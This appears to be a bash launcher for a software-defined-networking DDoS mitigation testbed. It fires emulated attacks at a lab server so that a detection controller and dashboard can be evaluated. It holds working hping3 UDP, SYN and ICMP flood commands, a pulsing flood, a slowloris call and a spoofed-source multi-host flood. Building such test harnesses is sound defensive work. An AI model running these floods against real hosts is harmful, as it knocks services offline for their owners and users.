#!/bin/bash
# ==============================================================================
# SDN DDoS Attack Emulation Suite & Interactive Launchpad
# ==============================================================================
# Provides unified emulation commands for:
#   1. Volumetric UDP Flood (Fast DDoS, high bandwidth)
#   2. TCP SYN Flood (L4 Handshake Exhaustion)
#   3. Slowloris / Low-and-Slow HTTP DoS (Application-layer starvation)
#   4. ICMP Echo / Ping Flood (Smurf / ICMP volumetric)
#   5. Pulsing / Periodic Burst Attack (Dynamic recovery test)
#   6. Multi-Source Botnet Attack (Simultaneous assault from h2, h4-h8)
# ==============================================================================

TARGET_IP="10.0.0.3"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

print_header() {
    clear
    echo "======================================================================"
    echo "       SDN DDOS MITIGATION — ATTACK EMULATION LAUNCHPAD               "
    echo "======================================================================"
    echo " Target Server : $TARGET_IP (Host h3)"
    echo " Detection     : Tier-1 CIC-DDoS2019 Decision Tree (Ryu Controller)"
    echo "======================================================================"
    echo ""
}

show_menu() {
    echo "Select an attack vector to launch:"
    echo "  [1] Fast Volumetric UDP Flood       (hping3 --flood --udp -p 80)"
    echo "  [2] TCP SYN Handshake Flood         (hping3 --flood -S -p 80)"
    echo "  [3] Slowloris Low-and-Slow HTTP DoS (python3 slowloris.py 150 conns)"
    echo "  [4] High-Rate ICMP Ping Flood       (hping3 --flood --icmp)"
    echo "  [5] Dynamic Pulsing / Wave Attack   (10s ON / 5s OFF bursts)"
    echo "  [6] Coordinated Multi-IP Botnet     (Launches h2, h4-h8 simultaneously)"
    echo "  [7] Stop All Background Attacks"
    echo "  [8] Start Legitimate User Stream    (iperf h1 -> h3 @ ~850 pkts/s baseline)"
    echo "  [0] Exit"
    echo ""
    read -p "Enter choice [0-8]: " choice
}

stop_attacks() {
    echo "[*] Terminating all active attack processes..."
    sudo pkill -f "hping3" 2>/dev/null
    sudo pkill -f "slowloris.py" 2>/dev/null
    echo "[+] All attack traffic halted."
}

case_launch() {
    case $1 in
        1)
            echo "[!] Launching Volumetric UDP Flood against $TARGET_IP:80..."
            echo "Press Ctrl+C to abort attack."
            sudo hping3 --flood --udp -p 80 $TARGET_IP
            ;;
        2)
            echo "[!] Launching TCP SYN Flood against $TARGET_IP:80..."
            echo "Press Ctrl+C to abort attack."
            sudo hping3 --flood -S -p 80 $TARGET_IP
            ;;
        3)
            echo "[!] Launching Slowloris Low-and-Slow Attack against $TARGET_IP:80..."
            python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 150
            ;;
        4)
            echo "[!] Launching ICMP Ping Flood against $TARGET_IP..."
            echo "Press Ctrl+C to abort attack."
            sudo hping3 --flood --icmp $TARGET_IP
            ;;
        5)
            echo "[!] Launching Dynamic Pulsing Attack against $TARGET_IP (10s flood / 5s pause)..."
            echo "Press Ctrl+C to stop."
            while true; do
                echo "[*] [PULSE ON] Flooding $TARGET_IP with UDP for 10s..."
                sudo timeout 10 hping3 --flood --udp -p 80 $TARGET_IP 2>/dev/null
                echo "[*] [PULSE OFF] Sleeping for 5s to allow controller recovery..."
                sleep 5
            done
            ;;
        6)
            echo "[!] Launching Distributed Botnet Assault across 6 IP addresses..."
            echo "    -> Node h2 (10.0.0.2): Volumetric UDP"
            echo "    -> Node h4 (10.0.0.4): TCP SYN Flood"
            echo "    -> Node h5 (10.0.0.5): Slowloris HTTP"
            echo "    -> Node h6 (10.0.0.6): ICMP Flood"
            echo "    -> Node h7 (10.0.0.7): HTTP Port 80 UDP Flood"
            echo "    -> Node h8 (10.0.0.8): Pulsing Flood"
            
            sudo hping3 -a 10.0.0.2 --flood --udp -p 80 $TARGET_IP >/dev/null 2>&1 &
            sudo hping3 -a 10.0.0.4 --flood -S -p 80 $TARGET_IP >/dev/null 2>&1 &
            sudo hping3 -a 10.0.0.6 --flood --icmp $TARGET_IP >/dev/null 2>&1 &
            sudo hping3 -a 10.0.0.7 --flood --udp -p 8080 $TARGET_IP >/dev/null 2>&1 &
            sudo hping3 -a 10.0.0.8 --flood --udp -p 53 $TARGET_IP >/dev/null 2>&1 &
            python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 80 >/dev/null 2>&1 &

            # Ensure continuous legitimate traffic from h1 runs in parallel
            iperf -c $TARGET_IP -u -b 10m -t 3600 >/dev/null 2>&1 &
            
            echo "[+] Distributed Botnet active in background alongside legitimate h1 user traffic!"
            echo "Observe the React Dashboard: All 6 attacker IPs are blocked, while legitimate h1 traffic is forwarded."
            echo "To stop: Run this menu again and choose Option [7]."
            read -p "Press Enter to return to menu..."
            ;;
        7)
            stop_attacks
            read -p "Press Enter to return to menu..."
            ;;
        8)
            echo "[*] Launching legitimate user stream from h1 to h3 (Server: $TARGET_IP)..."
            iperf -c $TARGET_IP -u -b 10m -t 3600 >/dev/null 2>&1 &
            echo "[+] Legitimate user stream (~850 pkts/s) active in background!"
            echo "Inspect the React Dashboard to observe Clean Forwarded traffic green line passing through."
            read -p "Press Enter to return to menu..."
            ;;
        0)
            exit 0
            ;;
        *)
            echo "Invalid selection."
            sleep 1
            ;;
    esac
}

# Check for non-interactive CLI argument (e.g., ./attack_menu.sh 1)
if [ -n "$1" ]; then
    case_launch "$1"
    exit 0
fi

# Interactive loop
while true; do
    print_header
    show_menu
    case_launch "$choice"
done
